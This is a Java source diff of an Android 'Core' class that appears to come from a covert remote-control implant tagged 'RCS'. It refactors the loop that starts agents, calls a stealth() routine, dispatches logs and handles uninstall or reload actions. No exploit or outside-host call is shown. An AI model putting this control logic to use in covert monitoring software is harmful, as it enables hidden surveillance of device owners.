@@ -84,7 +84,8 @@ public class Core extends Activity implements Runnable {
 	 */
 	public boolean Stop() {
 		bStopCore = true;
-		Log.d("RCS", "RCS Thread Stopped");
+		Status.self().unTriggerAll();
+		Log.d(TAG, "RCS Thread Stopped");
 		return true;
 	}
 
@@ -95,11 +96,11 @@ public class Core extends Activity implements Runnable {
 	 * @see java.lang.Runnable#run()
 	 */
 	public void run() {
-		Log.d("RCS", "RCS Thread Started");
+		Log.d(TAG, "RCS Thread Started");
 
 		stealth();
 		try {
-			for (;;) {
+			while (!bStopCore) {
 				Log.d(TAG,"Info: init task");
 				
 				if (taskInit() == false) {
@@ -113,13 +114,13 @@ public class Core extends Activity implements Runnable {
 				Status.self().setRestarting(false);
 				Log.d(TAG,"Info: starting checking actions");
 				
-				if (checkActions() == false) {
+				if (checkActions() == Exit.RELOAD) {
+					Log.d(TAG,"Info: Waiting a while before reloading");
+					Utils.sleep(2000);					
+				} else {
 					Log.d(TAG,"Error: CheckActions() wants to exit");
 					// chiudere tutti i thread
 					break;
-				} else {
-					Log.d(TAG,"Info: Waiting a while before reloading");
-					Utils.sleep(2000);
 				}
 			}
 		} catch (final Exception ex) {
@@ -137,13 +138,13 @@ public class Core extends Activity implements Runnable {
 	 * 
 	 * @return true, if successful
 	 */
-	private boolean checkActions() {
+	private Exit checkActions() {
 		final Status status = Status.self();
 
 		Utils.sleep(1000);
 
 		try {
-			for (;;) {
+			while (!bStopCore) {
 				Log.d(TAG,"checkActions");
 				final int[] actionIds = status.getTriggeredActions();
 
@@ -154,27 +155,30 @@ public class Core extends Activity implements Runnable {
 						final int actionId = actionIds[k];
 
 						final Action action = status.getAction(actionId);
-						final int exitValue = executeAction(action);
+						final Exit exitValue = executeAction(action);
 
-						if (exitValue == 1) {
+						if (exitValue == Exit.UNINSTALL) {
 							Log.d(TAG,"Info: checkActions: Uninstall");
 							UninstallAction.actualExecute();
-							return false;
-						} else if (exitValue == 2) {
+							return exitValue;
+						} else if (exitValue == Exit.RELOAD) {
 							Log.d(TAG,"checkActions: want Reload");
-							return true;
+							return exitValue;
 						}
 					}
 				}
 
 				Utils.sleep(SLEEPING_TIME);
 			}
+			
+			return Exit.STOP;
 		} catch (final Throwable ex) {
 			// catching trowable should break the debugger anc log the full
 			// stack trace
-			Log.wtf(TAG,"checkActions error, restart: " + ex);
-			return true;
+			Log.d(TAG,"FATAL: checkActions error, restart: " + ex);
+			return Exit.ERROR;
 		}
+		
 	}
 
 	/**
@@ -215,15 +219,15 @@ public class Core extends Activity implements Runnable {
 			}
 			
 			Log.d(TAG,"Info: Agents started");
-			Log.d("RCS", "Core initialized");
+			Log.d(TAG, "Core initialized");
 			return true;
 
 		} catch (final RCSException rcse) {
 			rcse.printStackTrace();
-			Log.d("RCS", "RCSException() detected");
+			Log.d(TAG, "RCSException() detected");
 		} catch (final Exception e) {
 			e.printStackTrace();
-			Log.d("RCS", "Exception() detected");
+			Log.d(TAG, "Exception() detected");
 		}
 
 		return false;
@@ -287,88 +291,14 @@ public class Core extends Activity implements Runnable {
 	}
 
 	/**
-	 * Test run.
-	 */
-	public void testRun() {
-		try {
-			final byte[] resource = Utils.InputStreamToBuffer(resources
-					.openRawResource(R.raw.config), 8); // config.bin
-
-			// Initialize the configuration object
-			final Configuration conf = new Configuration(resource);
-
-			// Identify the device uniquely
-			final Device device = Device.self();
-
-			// Load the configuration
-			conf.LoadConfiguration();
-
-			// Start log dispatcher
-			final LogDispatcher logDispatcher = LogDispatcher.self();
-			logDispatcher.start();
-
-			// Start agents
-			agentManager.startAll();
-			Utils.sleep(2000);
-			/*
-			 * agentManager.stopAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
-			 * agentManager.startAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
-			 * agentManager.restartAgent(Agent.AGENT_DEVICE); Utils.sleep(2000);
-			 */
-			// Stop agents
-			agentManager.stopAll();
-			Utils.sleep(2000);
-
-			final Status status = Status.self();
-			status.triggerAction(0);
-			final int[] actionIds = status.getTriggeredActions();
-			final int asize = actionIds.length;
-			
-			if (asize > 0) {
-				for (int k = 0; k < asize; ++k) {
-					final int actionId = actionIds[k];
-					final Action action = status.getAction(actionId);
-					final int exitValue = executeAction(action);
-
-					if (exitValue == 1) {
-						// Log.d(TAG,"Info: checkActions: Uninstall");
-						// UninstallAction.actualExecute();
-						// return false;
-					} else if (exitValue == 2) {
-						// Log.d(TAG,"checkActions: want Reload");
-						// return true;
-					}
-				}
-			}
-
-			// Ci stiamo chiudendo
-			logDispatcher.halt();
-			logDispatcher.join();
-
-			Log.d("RCS", "LogDispatcher Killed");
-
-		} catch (final RCSException rcse) {
-			rcse.printStackTrace();
-			Log.d("RCS", "RCSException() detected");
-		} catch (final Exception e) {
-			e.printStackTrace();
-			Log.d("RCS", "Exception() detected");
-		}
-
-		Log.d("RCS", "Exiting core");
-		return;
-
-	}
-
-	/**
 	 * Execute action.
 	 * 
 	 * @param action
 	 *            the action
 	 * @return the int
 	 */
-	private int executeAction(final Action action) {
-		int exit = 0;
+	private Exit executeAction(final Action action) {
+		Exit exit = Exit.SUCCESS;
 		Log.d(TAG,"CheckActions() triggered: " + action);
 		final Status status = Status.self();
 		status.unTriggerAction(action);
@@ -417,15 +347,15 @@ public class Core extends Activity implements Runnable {
 				Log.d(TAG,"CheckActions() waited");
 				
 				if (subAction.wantUninstall()) {
-					Log.w(TAG,"CheckActions() uninstalling");
-					exit = 1;
+					Log.d(TAG,"Warn: " +"CheckActions() uninstalling");
+					exit = Exit.UNINSTALL;
 					break;
 					// return false;
 				}
 
 				if (subAction.wantReload()) {
 					status.setRestarting(true);
-					Log.w(TAG,"checkActions: reloading");
+					Log.d(TAG,"Warn: " +"checkActions: reloading");
 					status.unTriggerAll();
 					Log.d(TAG,"checkActions: stopping agents");
 					agentManager.stopAll();
@@ -435,13 +365,13 @@ public class Core extends Activity implements Runnable {
 					Log.d(TAG,"checkActions: untrigger all");
 					status.unTriggerAll();
 					// return true;
-					exit = 2;
+					exit = Exit.RELOAD;
 					break;
 
 				}
 
 				if (ret == false) {
-					Log.w(TAG,"CheckActions() error executing: " + subAction);
+					Log.d(TAG,"Warn: " +"CheckActions() error executing: " + subAction);
 					continue;
 				}
 			} catch (final Exception ex) {
@@ -452,21 +382,4 @@ public class Core extends Activity implements Runnable {
 		return exit;
 	}
 
-	/**
-	 * Inits the.
-	 * 
-	 * @return true, if successful
-	 */
-	public boolean Init() {
-		return false;
-	}
-
-	/**
-	 * Run.
-	 * 
-	 * @return true, if successful
-	 */
-	public boolean Run() {
-		return false;
-	}
 }
